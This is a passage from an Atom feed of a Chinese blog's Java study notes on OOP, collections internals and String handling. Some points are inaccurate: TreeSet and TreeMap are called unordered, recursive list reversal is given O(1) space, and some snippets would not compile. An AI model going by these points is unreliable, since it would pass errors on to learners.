        <id>https://yao177.github.io/post/java-ji-chu-ormian-xiang-dui-xiang/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-ormian-xiang-dui-xiang/">
        </link>
        <updated>2020-09-15T12:51:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="基础">基础</h1>
<p>数据第一位，适合规模较大的使用场景</p>
<ul>
<li>行为 behavior：public 方法</li>
<li>状态 state：被动通过调用方法改变</li>
<li>标识 identity</li>
</ul>
<p>开发流程：设计类，添加方法</p>
<h3 id="类间关系">类间关系</h3>
<ul>
<li>依赖「uses-a」</li>
<li>聚合「has-a」</li>
<li>继承「is-a」</li>
</ul>
<p>这是 PlantUML 的中文教程，可以用纯代码的方式画 UML 图（原理类似于 Markdown 语法）</p>
<p>PlantUML_Language_Reference_Guide_zh.pdf2.00MB</p>
<h3 id="对象引用">对象引用</h3>
<p>比较像 C++ 中的对象指针，不拷贝无副本</p>
<p>想要实现深拷贝需要使用 clone 方法</p>
<p>clone 真的是深拷贝吗？尝试后发现，引用类型属性更改后同时更改 -&gt; 浅拷贝！</p>
<p>想要深拷贝，必须实现 Cloneable，并覆写 clone 方法 -&gt; 代码繁琐</p>
<p>搜索后得知，可以使用序列化对象的方法——将对象转成二进制流，然后再把二进制流反序列成一个java对象，这时候反序列化生成的对象是一个全新的对象，里面的信息与原对象一样，但是所有内容都是一份新的</p>
<p>所有类都需要实现 Serializable 接口，以便进行序列化操作</p>
<pre><code class="language-java">public class DeepClone implements Serializable{
		private static final long serialVersionUID = 1L;
		/** 
			* 利用序列化和反序列化进行对象的深拷贝 
			* @return * @throws Exception 
			*/	
		protected Object deepClone() throws Exception{	
		//序列化	
		ByteArrayOutputStream bos = new ByteArrayOutputStream();	
		ObjectOutputStream oos = new ObjectOutputStream(bos);	
		oos.writeObject(this);	
		//反序列化	
		ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());	
		ObjectInputStream ois = new ObjectInputStream(bis);	
		return ois.readObject();	
		}
}
</code></pre>
<h3 id="更改器-访问器">更改器 访问器</h3>
<p>Date 类、LocalDate 类、GregorianCalendar 类</p>
<p>访问器方法：LocalDate 在调用 plusDays 方法后会生成一个新的对象，而不会更改本来的 LocalDate 对象（类似 toUpperCase）</p>
<p>更改器方法：GregorianCalendar 类调用 add 方法时就会更改现有对象状态</p>
<h3 id="对象创建-方法">对象创建 方法</h3>
<ul>
<li>在堆中</li>
<li>需要用 new 操作符</li>
<li>区别于 C++（<code>Object::Fuction()</code>），直接在类内部定义即可（JVM 决定是否内联）</li>
</ul>
<h3 id="封装">封装</h3>
<p>一个私有数据域 + 一个公有域访问器方法 + 一个公有域更改器方法</p>
<p>不要编写返回引用可变对象的访问器方法｜一个可变数据域的拷贝，实在需要必须先 clone</p>
<p>public &gt; default（默认，package 内） &gt; protected &gt; private</p>
<h3 id="final-修饰符">final 修饰符</h3>
<ol>
<li>应修饰「基本类型」/「不可变类」的数据域</li>
<li>若修饰一个可变类，只是限制了不可以引用其它对象，但该对象可以更改</li>
</ol>
<h3 id="static-修饰符">static 修饰符</h3>
<ol>
<li>静态域（private static 数据域）：类对象共享，可修改，只能用类名+方法访问</li>
<li>静态常量（public static final 数据域）：Math.PI, System.Out</li>
<li>静态方法（static 方法）：无 this 参数 -&gt; 不能访问实例域；可以访问静态域，可以用对象变量调用</li>
<li>工厂方法（工厂模式——定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行）：使用静态方法构造对象</li>
<li>main 方法：每个类都可以有一个 main 方法（常用于测试），可单独运行也可运行这个项目</li>
</ol>
<h3 id="修饰符顺序">修饰符顺序</h3>
<p>Java 语言规范建议按以下顺序列出修饰符：</p>
<ol>
<li>Annotations</li>
<li>public</li>
<li>protected</li>
<li>private</li>
<li>abstract</li>
<li>static</li>
<li>final</li>
<li>transient</li>
<li>volatile</li>
<li>synchronized</li>
<li>native</li>
<li>strictfp</li>
</ol>
<h3 id="方法の参数">方法の参数</h3>
<p>基本类型复制拷贝，对象引用使用引用值（依然是值，相当于一个 final）即不能进行新的引用</p>
<h1 id="对象构造">对象构造</h1>
<h3 id="重载-overloading-resolution">重载 overloading resolution</h3>
<p>唯一性——方法签名（signature）</p>
<ul>
<li>方法名</li>
<li>参数类型</li>
<li><s>返回类型</s></li>
</ul>
<p>和 C++ 中一样，如果方法名和参数类型都一致而返回类型不一致，就会报错——重复定义方法</p>
<h3 id="构造函数">构造函数</h3>
<ol>
<li>默认构造为默认数值</li>
</ol>
<ul>
<li>数值：0</li>
<li>布尔值：False</li>
<li>对象引用：null</li>
</ul>
<p>不推荐使用默认构造，因为当使用 getXxx 方法时，会获得一个 null 引用</p>
<p>this 可以调用另一个构造起</p>
<ol start="2">
<li>如果写了构造器，那就必须包括一个无参构造 / 显式域初始化（声明中赋值）/ 初始化块（{这里进行初始化}）</li>
</ol>
<p>静态初始化块可以方便得对静态域进行初始化</p>
<pre><code class="language-java">// static initialization block
static {	
		Random generator = new Random();	
		nextId = generator.nextInt(1000);
}
</code></pre>
<p>析构：因为 GC 机制，Java 不支持析构器</p>
<h3 id="导入类">导入类</h3>
<p>import package 中，「<em>」只可以导入一个包，而不可以使用 import java.</em> 或者 import java.<em>.</em>；与 C++ 中不同的是，include 必须添加以载入外部特性，而 Java 中给全包名可以不使用 import，类似于 using namespace。也可以导入静态方法和静态域，import lang.System.out;</p>
<p>类放入包，package com.x.xx.xxx 对应文件目录为 com/x/xx/xxx 中，如果不匹配，虚拟机就找不到类（可编译不可运行）。</p>
<h3 id="类设计">类设计</h3>
<ol>
<li>
<p>数据私有</p>
</li>
<li>
<p>数据初始化</p>
</li>
<li>
<p>用其它类代替多个相关的基本类型：便于处理</p>
<pre><code class="language-java">private String street;
private String city;
private String state;
private int zip;
// turn to class Address
private Address addr;
</code></pre>
</li>
<li>
<p>不是所有的域都需要独立的域访问器和域更改器：会有一些私有不想被外界修改的实例域</p>
</li>
<li>
<p>将职责过多的类进行分解</p>
</li>
<li>
<p>类名和方法名能够体现他们的职责：类名通常是带有形容词修饰的名次，方法通常是动宾结构</p>
</li>
<li>
<p>优先使用不可变的类：计算生成返回新值，而不是修改更新原来的值；一些情况会很奇怪</p>
</li>
</ol>
<h1 id="继承">继承</h1>
<p>superclass 超类，subclass 子类；通用方法放超类，特殊用途放子类</p>
<h3 id="覆盖-override">覆盖 override</h3>
<pre><code class="language-java">public class Manager extends Employee {	
		... 
		public double getSalary() {	
				return salary + bonus; // won't work	
				return getSalary() + bonus; // still won't work	
				return super.getSalary() + bonus; // works	
				... 
				} 
		...
}
</code></pre>
<ul>
<li>使用 super 调用超类的方法</li>
<li>不是引用，不能赋给另一个对象变量</li>
<li>也可用 super 调用超类的构造器</li>
</ul>
<h2 id="多态">多态</h2>
<ul>
<li>同一个变量可以引用一个超类对象，也可以引用它的任一子类对象</li>
<li>置换法则：程序中出现超类对象的任何地方都可以用子类对象置换</li>
<li>子类的引用可以转为超类的引用，但超类的引用无法赋给子类变量</li>
<li>子类数组引用可以转换为超类数组引用，再赋值为超类时会导致类型错误</li>
<li>private、static、final 方法时，准确知道调用哪个方法，称为静态绑定（static binding）</li>
<li>动态绑定（dynamic binding），VM 维护一个方法表（method table）查找调用方法</li>
<li>子类方法不能低于超类方法的可见性，尽量将通用域和方法都放在超类中</li>
<li>调用方法过程：VM 提取类的实际类型的<em>方法表</em>，然后搜索定义该方法签名的类（此时）</li>
</ul>
<h3 id="抽象类">抽象类</h3>
<ul>
<li>占位，不可实例化，具体实现在子类中</li>
<li>抽象类对象只能引用非抽象子类对象；</li>
</ul>
<h3 id="object-所有类的超类">Object 所有类的超类</h3>
<p>定义子类 equals 需要先调用超类的 equals，再比较子类中的实例域</p>
<p>防止可能为 null，使用 Objects.equals 方法判断</p>
<p>equals 要求：自反性、对称性、传递性、一致性</p>
<p>覆盖超类方法时使用 @Override 进行标记</p>
<p>默认的 hashCode 散列码为对象的存储地址（String 有着相同的散列码，StringBuilder 没有定义所以不同）；Objects.hash 可以提供多个参数；Arrays.hashCode</p>
<p>toString：类名 + [域值]；x.toString == &quot;&quot;+x 会自动调用 toString；Arrays.toString / Array.deepToString 多维数组</p>
<h3 id="泛型数组列表">泛型数组列表</h3>
<p>ArrayList&lt;type_parameter&gt;() 采用类型参数的泛型类，类似 C++ 中的 vector 模版，确认大小不再变化后可以调用 trimToSize 方法，让 GC 回收多余的存储空间；使用 add、get、set 访问和修改</p>
<h3 id="包装器-自动装箱">包装器 &amp; 自动装箱</h3>
<p>前六个有共同的超类 Number，Void 即 null</p>
<p>可自动拆箱、装箱；包装器对象比较时调用 equals 方法；装箱时 null 会报空指针异常；包装器都是 final 不可变的</p>
<h3 id="参数数量可变的方法">参数数量可变的方法</h3>
<p>fuction(String mine, Object... args) {}</p>
<p>防止重载相同的错误 <a href="https://www.cnblogs.com/lanxuezaipiao/p/3190673.html">https://www.cnblogs.com/lanxuezaipiao/p/3190673.html</a></p>
<h1 id="几个小问题">几个小问题</h1>
<ol>
<li>什么时候用继承，继承和组合的关系是什么：is、has聚合/contain组合</li>
<li>什么是多态，在继承的体系中是怎么样的，为什么要用多态：同样方法，不同对象，不同实现；子类方法被超类所用，维护扩展</li>
<li>重载和重写的区别：都是多态</li>
<li>值传递和引用传递：基本类型传值，对象传地址（值）</li>
<li>自动拆装箱的使用（什么时候）：表达式计算——先拆再算后装，类型转换 toString</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜Java 集合]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orjava-ji-he/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orjava-ji-he/">
        </link>
        <updated>2020-09-15T10:09:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="总述">总述</h1>
<ul>
<li><em>Collection</em>
<ul>
<li><em>List</em>：有序可重
<ul>
<li><em>LinkedList</em></li>
<li><em>ArrayList</em></li>
</ul>
</li>
<li><em>Set</em>：不可重
<ul>
<li><em>HashSet</em>：无序；类 HashMap</li>
<li><em>LinkedHashSet</em>：有序；类 LinkedHashMap</li>
<li><em>TreeSet</em>：无序；类 TreeMap</li>
</ul>
</li>
</ul>
</li>
<li><em>Map</em>：不可重
<ul>
<li><em>HashMap</em>：无序</li>
<li><em>LinkedHashMap</em>：有序</li>
<li><em>TreeMap</em>：无序</li>
</ul>
</li>
</ul>
<hr>
<h1 id="单独详解">单独详解</h1>
<h2 id="linkedlist">LinkedList</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1600164949835.png" alt="LinkedList 类图" loading="lazy"></figure>
<h3 id="基本介绍">基本介绍</h3>
<ol>
<li>双向链表，头尾双指针</li>
<li>队列使用：头进尾出，FIFO；栈使用：头进头出，FILO</li>
<li>无限扩容</li>
<li>功能上类似 ArrayList + ArrayDeque</li>
</ol>
<h3 id="是否有虚拟头节点">是否有虚拟头节点？</h3>
<ol>
<li>无</li>
<li>添加和删除时会判断是否为唯一节点</li>
</ol>
<h3 id="反转链表操作">反转链表操作</h3>
<ol>
<li>
<p>递归，空间复杂度 O(1)</p>
<pre><code class="language-java">public ListNode Reverse(ListNode list) {
    if (list == null) return null; // first question

    if (list.next == null) return list; // second question

    // third question - in Lisp this is easy, but we don't have cons
    // so we grab the second element (which will be the last after we reverse it)

    ListNode secondElem = list.next;

    // bug fix - need to unlink list from the rest or you will get a cycle
    list.next = null;

    // then we reverse everything from the second element on
    ListNode reverseRest = Reverse(secondElem);

    // then we join the two lists
    secondElem.Next = list;

    return reverseRest;
}
</code></pre>
</li>
<li>
<p>双指针</p>
</li>
<li>
<p>当成栈，推入另一个栈，空间复杂度 O(N)</p>
</li>
</ol>
<h3 id="时间复杂度">时间复杂度</h3>
<ul>
<li>随机访问：O(N)</li>
<li>查找：O(N)</li>
<li>插入删除
<ul>
<li>头尾：O(1)</li>
<li>中部：O(N)</li>
</ul>
</li>
</ul>
<h2 id="arraylist">ArrayList</h2>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1600164973242.png" alt="ArrayList 类图" loading="lazy"></figure>
<h3 id="基本介绍-2">基本介绍</h3>
<ol>
<li>较普通数组来讲，具有动态扩展的能力，因此也可称之为「动态数组」</li>
<li>默认长度为 10，扩容每次是 1.5 倍（<code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>）</li>
<li>删除元素不会缩容，最后一位置 <code>nul</code>便于 GC 回收</li>
<li>并集<code>addAll()</code>，交集<code>retainAll()</code>，单向差集<code>removeAll()</code></li>
</ol>
<h3 id="初始化">初始化</h3>
<ul>
<li>new ArrayList()：从 10 开始，逐步扩容</li>
<li>new ArrayList(0)：从 0 开始，到 1，逐步扩容</li>
</ul>
<h3 id="如何插入元素如何扩容">如何插入元素？如何扩容</h3>
<ol>
<li>检查是否需要扩容</li>
<li><code>elementData</code>为<code>DEFAULTCAPACITY_EMPTY_ELEMENTDATA</code>则初始化容量为<code>DEFAULT_CAPACITY</code>也就是 10</li>
<li>新容量是老容量的1.5倍（<code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>）；如果加了这么多容量发现比需要的容量还小，则以需要的容量为准；如果超过新容量超过最大容量，则使用最大容量</li>
<li>创建新容量的数组并把老数组拷贝到新数组</li>
</ol>
<p>PS：有个注意点，扩容函数传入的是 oldCap + 1，保证了数组大小小于 2 的情况下不会不扩容</p>
<h2 id="hashset">HashSet</h2>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1600165004129.png" alt="HashSet 类图" loading="lazy"></figure>
<p>一个 HashMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="linkedhashset">LinkedHashSet</h2>
<p>一个 LinkedHashMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="treeset">TreeSet</h2>
<p>一个 TreeMap，key 为值、value 为<code>PRESENT</code></p>
<h2 id="hashmap">HashMap</h2>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1600165019290.png" alt="HashMap 类图" loading="lazy"></figure>
<h3 id="基本介绍-3">基本介绍</h3>
<ol>
<li>key-value 存储结构，数组 + 链表 + 红黑树的结构</li>
<li>查询和修改速度很快，能达到 O(1) 的平均时间复杂度</li>
<li>容量为数组长度，默认 16，最大为 2^30，达到 64 时可以树化；装载因子用来计算容量达到多少时进行扩容，默认装载因子为 0.75</li>
<li>数组容量≥64 &amp; 链表长度≥8 进行树化，链表长度≤6 时反树化</li>
</ol>
<h3 id="节点">节点</h3>
<ul>
<li>
<p>链表节点<code>Node</code></p>
<pre><code class="language-java">static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; {
    final int hash;
    final K key;
    V value;
    Node&lt;K,V&gt; next;
}
</code></pre>
</li>
<li>
<p>红黑树节点<code>TreeNode</code></p>
<pre><code class="language-java">// 位于HashMap中
static final class TreeNode&lt;K,V&gt; extends LinkedHashMap.Entry&lt;K,V&gt; {
    TreeNode&lt;K,V&gt; parent;  // red-black tree links
    TreeNode&lt;K,V&gt; left;
    TreeNode&lt;K,V&gt; right;
    TreeNode&lt;K,V&gt; prev;    // needed to unlink next upon deletion
    boolean red;
}

// 位于LinkedHashMap中，典型的双向链表节点
static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; {
    Entry&lt;K,V&gt; before, after;
    Entry(int hash, K key, V value, Node&lt;K,V&gt; next) {
        super(hash, key, value, next);
    }
}
</code></pre>
</li>
</ul>
<h3 id="hash-过程">Hash 过程</h3>
<p>key 为 null，hash 值为 0</p>
<p>高 16 位与整个 hash 值异或，为了使计算出的 hash 更分散</p>
<p><code>n % k == n &amp; (k - 1)</code></p>
<p>解决 hash 冲突的办法是「拉链法」，而 Java 的 ThreadLocalMap、Python 的 dict 则使用了开放寻址法</p>
<h3 id="插入节点过程">插入节点过程</h3>
<ol>
<li>计算 key 的 hash</li>
<li>桶数量为 0，则初始化桶</li>
<li>三种情况
<ol>
<li>key 所在桶无元素，直接插入</li>
<li>key 所在桶的第一个元素的 key 与待插入的 key 相同，说明找到了元素，转到「5」</li>
<li>第一个元素为树节点，调用<code>putTreeVal()</code></li>
</ol>
</li>
<li>不是这三种情况，则遍历桶对应的链表查找 key 是否存在
<ol>
<li>找到了对应 key 的元素，转到「5」</li>
<li>没找到对应 key 的元素，则在链表最后插入一个新节点并判断是否需要树化</li>
</ol>
</li>
<li>找到了对应 key 的元素，则判断是否需要替换旧值，并直接返回旧值</li>
<li>如果插入了元素，则数量 +1 并判断是否需要扩容</li>
</ol>
<h3 id="尾插法">尾插法</h3>
<p>Java 7 及之前是头插法：后面的值被查找的概率更大一些</p>
<p>尾插法：扩容分链前后链表顺序不变，保持了之前节点的引用关系，防止 1-&gt;2-&gt;1 的死链产生</p>
<p>依旧不是线程安全的，put / get 依旧没有同步锁，会出现 ABA 的问题</p>
<h3 id="扩容机制">扩容机制</h3>
<p>桶为空的话，第一次加入元素时进行初始化</p>
<p>扩容门槛为传入的初始容量往上取最近的 2^n</p>
<p>拷贝原数组</p>
<h2 id="linkedhashmap">LinkedHashMap</h2>
<figure data-type="image" tabindex="5"><img src="https://yao177.github.io/post-images/1600165037900.png" alt="LinkedHashMap 类图" loading="lazy"></figure>
<h3 id="accessorder-是什么">accessOrder 是什么</h3>
<p>先看看在哪里使用了</p>
<pre><code class="language-java">public V get(Object key) {
    Node&lt;K,V&gt; e;
    if ((e = getNode(hash(key), key)) == null)
        return null;
    if (accessOrder)
        afterNodeAccess(e);
    return e.value;
}
</code></pre>
<p>看一下 <code>afterNodeAccess()</code>的代码，可以看到最大的不同就是，调用 get 方法时，都会将访问的 Node 移动到尾部，成为尾节点，也就是控制了访问顺序。</p>
<p>因此，置为 true 后，则使用 LRU 调度算法（最近最少使用）。</p>
<h2 id="treemap">TreeMap</h2>
<figure data-type="image" tabindex="6"><img src="https://yao177.github.io/post-images/1600165054964.png" alt="TreeMap 类图" loading="lazy"></figure>
<h3 id="基本介绍-4">基本介绍</h3>
<ul>
<li>实现了 SortedMap 接口，因此是经过排序的</li>
<li>只使用到了红黑树，所以时间复杂度为 O(log N)</li>
</ul>
<h3 id="排序问题">排序问题</h3>
<p>红黑树根据 key 进行排序，有两种方式</p>
<ol>
<li>key 实现 Comparable 接口</li>
<li>构造时传入比较器</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜Java String]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orjava-string/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orjava-string/">
        </link>
        <updated>2020-09-15T10:05:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="string-字符串">String 字符串</h1>
<p>Unicode 字符序列</p>
<p>C++ 中的 <code>char*</code></p>
<pre><code class="language-java">substring(start_index, first_excluded_index)
length(substring(a, b)) = b - a
str_a.equals(str_b) = (str_a.compareTo(str_b) == 0)
str_a.equalsIgnore(str_b)
</code></pre>
<h2 id="不可变">不可变</h2>
<ul>
<li>用 <code>String.substring()</code> 和 <code>+</code> 拼接后重新赋值</li>
<li>效率？→ 字符串共享
<ul>
<li>仅字符串常量，其他+/substring 生成的不共享 → <code>==</code> 不能用来测试相等性</li>
</ul>
</li>
<li>怎么不可变？（用 C++ 的 <code>char*</code> 比较好理解）</li>
<li>指向的位置上的字符串内存不可变，</li>
</ul>
<h2 id="vs-equals-vs-compareto"><code>==</code> VS <code>equals()</code> VS <code>compareTo()</code></h2>
<pre><code class="language-java">// equals 源码
public boolean equals(Object anObject) {
    if (this == anObject) { // 内存位置一致
        return true;
    }
    if (anObject instanceof String) {
        String anotherString = (String) anObject; // 其它类型先转换为 String 类型
        int n = value.length;
        if (n == anotherString.value.length) {
            char v1[] = value;
            char v2[] = anotherString.value;
            int i = 0;
            while (n-- != 0) {
                if (v1[i] != v2[i]) return false;
                i++;
            }
            return true;
        }
    }
    return false;
}

// compareTo 源码
public int compareTo(String anotherString) {
		int len1 = value.length; int len2 = anotherString.value.length; 
		int lim = Math.min(len1, len2); 
		char v1[] = value; char v2[] = anotherString.value; 
		int k = 0; 
		while (k &lt; lim) { // 字典序大小比较 
				char c1 = v1[k]; 
				char c2 = v2[k]; 
				if (c1 != c2) { 
							return c1 - c2; 
				} 
				k++; 
		} 
		return len1 - len2;
}
</code></pre>
<p>equals 类似 C++ 中的 <code>==</code>，compareTo 类似 <code>strcmp</code></p>
<ul>
<li>返回值不同
<ul>
<li>equals 只判断是否相同</li>
<li>compareTo 判断大小比较，正大负小=同</li>
</ul>
</li>
<li>比较类型不同
<ul>
<li>equals 可以和非字符串进行比较，转换为 String 类型</li>
<li>compareTo 只能和字符串变量比较</li>
</ul>
</li>
<li>效率
<ul>
<li>equals 比 compareTo 稍微快一些（加了一些前置判断），如果只判断是否相等建议使用 equals</li>
</ul>
</li>
<li>使用范围
<ul>
<li>Object 自带 equals 方法，基本都可用（默认实现为 <code>==</code>）</li>
<li>实现了 Comparable 接口的类才有 compareTo 方法</li>
</ul>
</li>
</ul>
<h2 id="空串和-null-串">空串（&quot;&quot;）和 null 串</h2>
<p>空串，长度为「0」、内容为「空」的 String 对象</p>
<p>null 串，无对象（类似于“空指针”），不是 String 对象，不可以使用 String 的方法</p>
<p><code>if (str != null &amp;&amp; str.length() != 0) {...} if (str != null &amp;&amp; !str.equals(&quot;&quot;)) {...}</code></p>
<h2 id="码点-代码单元">码点、代码单元</h2>
<p>char 是「一个采用 UTF-16 编码表示的代码单元」，用来表示 Unicode 码点。</p>
<p>UTF-16 有一些用两个字节表示一个符号的情况，</p>
<p>编号为 U+D800 至 U+DBFF 的规定为「High Surrogates」，共 102 4个；编号为 U+DC00 至 U+DFFF 的规定为「Low Surrogates」，也是 1024 个；他们组合出现，就又可以多表示 1048576 种字符。</p>
<p>一个字符对应一个码点，因此有可能是 1 也有可能是 2 个字节</p>
<h2 id="stringbuilder-vs-stringbuffer">StringBuilder vs StringBuffer</h2>
<p>用于 String 拼接的 <code>+</code> 即是 SringBuilder，查看字节码可知</p>
<pre><code class="language-java">LINENUMBER 28 L3
NEW java/lang/StringBuilder
DUP
INVOKESPECIAL java/lang/StringBuilder.&lt;init&gt; ()V
ALOAD 0
INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
ALOAD 1
INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
ASTORE 3
</code></pre>
<p>也就是说，调用了</p>
<pre><code class="language-java">c = a + b;
c = new StringBuilder().append(a).append(b).toString();
// 如果有性能需求
c = new StringBuilder(a.length() + b.length()).append(a).append(b).toString();
// 可正确调整缓冲区大小，并防止 JVM 重新调整缓冲区大小并创建垃圾以进行收集
</code></pre>
<p>顺便看一下StringBuilder.append()的源码：</p>
<pre><code class="language-java">public AbstractStringBuilder append(String str) {
    if (str == null) {
        return appendNull();
    }
    int len = str.length();
    ensureCapacityInternal(count + len);
    putStringAt(count, str);
    count += len;
    return this;
}

private final void putStringAt(int index, String str) {
    if (getCoder() != str.coder()) {
        inflate();
    }
    str.getBytes(value, index, coder);
}

void getBytes(byte dst[], int dstBegin, byte coder) {
    if (coder() == coder) {
        System.arraycopy(value, 0, dst, dstBegin &lt;&lt; coder, value.length);
    } else { // this.coder == LATIN &amp;&amp; coder == UTF16 
        StringLatin1.inflate(value, 0, dst, dstBegin, value.length);
    }
}
</code></pre>
<p>有点类似 C++ 中 strcpy 的做法，直接拷贝内存地址上的内容</p>
<p>关于<em>线程安全</em>，StringBuilder 是不安全的，StringBuffer 是安全的；StringBuffer 源码中每个方法都添加了 <strong>synchronized</strong> 关键字，举个例子</p>
<pre><code class="language-java">public synchronized StringBuffer append(String str) {
    toStringCache = null;
    super.append(str);
    return this;
}
</code></pre>
<p>~~如果手动添加 <strong>synchronized</strong> 关键字呢？~~不要这样使用</p>
<pre><code class="language-java">public class Foo { // safe ? 
    private final static StringBuilder builder;

    public static void foo() { // safe ? 
        builder = new StringBuilder();
    }

    public static void foo(final String a) { // unsafe ? 
        builder.append(a);
    }

    public synchronized void bar(final String a) { // safe ? 
        builder.append(a);
    }
}
</code></pre>
<h1 id="结论">结论</h1>
<p><strong>直接使用 StringBuilder 局部变量，用完即销毁就可以！</strong></p>
]]></content>
    </entry>
</feed>